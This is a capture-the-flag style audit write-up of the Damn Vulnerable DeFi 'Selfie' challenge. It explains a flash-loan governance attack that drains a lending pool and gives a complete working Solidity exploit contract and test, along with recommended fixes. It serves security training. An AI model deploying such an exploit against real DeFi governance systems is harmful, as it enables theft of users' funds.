# Selfie - Audit Report

**Protocol:** Selfie<br>
**Challenge:** Damn Vulnerable DeFi<br>
**Time Spent:** 40 minutes<br>
**Status:** Solved
---

## Executive Summary

**Vulnerability Found:** Flash loan governance attack allowing unauthorized token drainage

**Severity:** Critical

**Attack Complexity:** Medium

**Impact:** Complete loss of 1.5M DVT tokens from pool

**Root Cause:** Governance voting power can be temporarily acquired through flash loans, allowing malicious proposals to be queued and later executed after loan repayment.

---

## Challenge Overview

**Objective:** Drain all 1.5M DVT tokens from the lending pool

**Initial State:**
- Pool balance: 1,500,000 DVT
- Attacker balance: 0 DVT
- Governance mechanism controls pool via SimpleGovernance contract

**Success Criteria:**
- [x] All funds rescued from pool
- [x] Funds deposited to recovery account

---

## Vulnerability Analysis

### Economic Incentive Analysis

**Attack Priority:**

1. **Governance Takeover** - Potential profit: 1.5M DVT, Cost: Gas only
   - Likelihood: High (trivial flash loan)
   - Impact: Critical (complete drainage)

2. **Direct Flash Loan Exploit** - Blocked by nonReentrant ✓

### Technical Analysis

**Vulnerable Component:** `SimpleGovernance.queueAction()` + ERC20Votes delegation

**Location:** 
- `SimpleGovernance.sol`
- Token voting mechanism

**Vulnerability Type:** Flash Loan Governance Attack

**Code Review:**

```solidity
// SimpleGovernance._hasEnoughVotes()
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);  
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;  // ← Only checks current voting power
}

// SelfiePool.emergencyExit()
function emergencyExit(address receiver) external onlyGovernance {
    // ← Can drain entire pool if called by governance
    token.transfer(receiver, token.balanceOf(address(this)));
}
```

**Why This Is Exploitable:**

- **Assumption:** Only legitimate token holders can queue governance actions
- **Reality:** Flash loans can provide temporary voting power (>50% supply)
- **Result:** Attacker can queue malicious proposal, repay loan, then execute proposal after timelock

**Attack Prerequisites:**

- [x] Flash loan available for >50% of token supply
- [x] Ability to delegate voting power
- [x] Understanding of governance timelock (2 days)

---

## Attack Vector

### Step-by-Step Exploit

**Phase 1: Acquire Voting Power**
1. Request flash loan of 1,500,000 DVT (>50% of 2M total supply)<br>
2. In callback, delegate voting power to attacker contract<br>
3. Now attacker has >750k votes (majority)<br>

**Phase 2: Queue Malicious Proposal**
4. Call `governance.queueAction()` with:
   - Target: SelfiePool address
   - Value: 0
   - Data: `emergencyExit(recovery)` encoded<br>
5. Action queued with actionId, timestamp recorded<br>

**Phase 3: Repay and Wait**
6. Approve flash loan repayment<br>
7. Return flash loan (lose tokens but KEEP the queued action)<br>
8. Wait 2 days for governance timelock<br>

**Phase 4: Execute**
9. Call `governance.executeAction(actionId)`<br>
10. EmergencyExit executes, sending all 1.5M DVT to recovery<br>

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC3156FlashBorrower} from "./interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "./SelfiePool.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableVotes} from "./DamnValuableVotes.sol";

contract SelfieExploit is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    address public recovery;
    uint256 public actionId;
    
    constructor(
        address _pool,
        address _governance,
        address _token,
        address _recovery
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
        recovery = _recovery;
    }
    
    function attack() external {
        // Request flash loan of entire pool balance
        uint256 loanAmount = token.balanceOf(address(pool));
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            loanAmount,
            ""
        );
    }
    
    function onFlashLoan(
        address initiator,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external override returns (bytes32) {
        require(msg.sender == address(pool), "Unauthorized");
        require(initiator == address(this), "Invalid initiator");
        
        // KEY: Delegate voting power to ourselves
        token.delegate(address(this));
        
        // Now we have >50% voting power, queue malicious action
        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", recovery)
        );
        
        // Approve and repay flash loan
        token.approve(address(pool), amount + fee);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

// In test:
function test_exploit() public {
    SelfieExploit exploit = new SelfieExploit(
        address(pool),
        address(governance),
        address(token),
        recovery
    );
    
    // Execute attack (queues proposal)
    exploit.attack();
    
    // Fast forward past governance delay
    vm.warp(block.timestamp + 2 days);
    
    // Execute queued action
    governance.executeAction(exploit.actionId());
    
    // Verify
    assertEq(token.balanceOf(address(pool)), 0);
    assertEq(token.balanceOf(recovery), 1_500_000e18);
}
```

---

## Recommendations

### Immediate Fixes

**1. Implement Snapshot-Based Voting**

```solidity
// BEFORE (Vulnerable)
function queueAction(...) external returns (uint256) {
    if (!_hasEnoughVotes(msg.sender)) revert;  // Checks current balance
    // ...
}

// AFTER (Fixed)
function queueAction(...) external returns (uint256) {
    // Snapshot voting power at proposal time
    uint256 snapshot = _votingToken.getPastVotes(
        msg.sender,
        block.number - 1
    );
    if (snapshot <= _votingToken.totalSupply() / 2) revert;
    // ...
}
```

**2. Add Proposal Deposit Requirement**

```solidity
// Require proposer to lock tokens for duration
function queueAction(...) external returns (uint256) {
    require(
        _votingToken.balanceOf(msg.sender) > threshold,
        "Insufficient locked tokens"
    );
    _votingToken.transferFrom(msg.sender, address(this), depositAmount);
    // Lock for proposal duration + timelock
}
```

**3. Implement Vote Delegation Delay**

```solidity
// Prevent immediate delegation of flash-loaned tokens
function delegate(address delegatee) public {
    require(
        block.timestamp > tokenAcquisitionTime[msg.sender] + DELEGATION_DELAY,
        "Cannot delegate immediately after receiving tokens"
    );
    _delegate(msg.sender, delegatee);
}
```

---

## Lessons Learned

### Pattern Identified

**Pattern Name:** Flash Loan Governance Attack

**Description:** Governance systems that use token-based voting without snapshots or delays are vulnerable to flash loan attacks, where attackers temporarily acquire voting majority to pass malicious proposals.

**Where This Appears:**
- DAO governance systems
- Token-weighted voting
- On-chain governance protocols
- DeFi protocol governance

**How to Spot It:**

```markdown
Red flags:
- Governance votes based on current token balance
- No snapshot mechanism
- No token lock/stake requirement for proposals
- Timelock delay doesn't prevent queuing (only execution)
```

### Key Takeaways

1. **Voting power ≠ Long-term alignment** - Flash loans provide temporary voting power without long-term investment
2. **Timelocks protect execution, not proposals** - 2-day delay doesn't prevent malicious proposal queuing
3. **Snapshots are critical** - Must snapshot voting power at proposal time, not execution time

### Real-World Examples

- **Beanstalk DAO** - Lost $182M to flash loan governance attack (2022)
- **Build Finance** - Lost $470k to flash loan governance attack (2021)
- **Compound** - Uses snapshot-based voting to prevent this

---

## Metadata

**Tools Used:**
- Foundry (testing & POC)
- Manual code review

**Pattern Library Entry:** `#05-flash-loan-governance-attack`

**Time Breakdown:**
- 00:00-00:15 - Challenge understanding & actor mapping
- 00:15-00:30 - Governance mechanism analysis
- 00:30-00:40 - Exploit strategy development
- 00:40-01:00 - POC implementation (with corrections)

**Total Time:** 40 minutes (concept), 60 minutes (with POC)

---

*Report generated on [1-11-2025] by [0xUnavailable]*  
*GitHub: [https://github.com/0xUnavailable]*  
*Twitter: [https://x.com/0xUnavailable]*